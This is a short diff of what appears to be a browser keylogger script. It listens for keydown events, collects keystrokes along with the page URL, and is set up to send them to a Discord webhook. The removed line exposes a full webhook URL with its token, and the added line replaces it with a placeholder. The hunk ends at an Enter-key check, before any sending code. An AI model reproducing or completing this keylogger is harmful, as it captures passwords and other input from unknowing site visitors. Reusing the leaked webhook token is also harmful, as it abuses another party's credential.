@@ -1,7 +1,7 @@
 let keys = "";
 const current = document.URL;
 const discordWebhook =
-  "https://discord.com/api/webhooks/1191027514953453691/2ZwAznybPmAaPCAzmK5SEc8Z8ccdXQMjmrkayXHNE3sNUnmLdvkNB9kbZNghTcn6z-S8";
+  "YOUR_WEBHOOK_HERE";
 document.addEventListener("keydown", (event) => {
   const key = event.key;
   if (key === "Enter") {
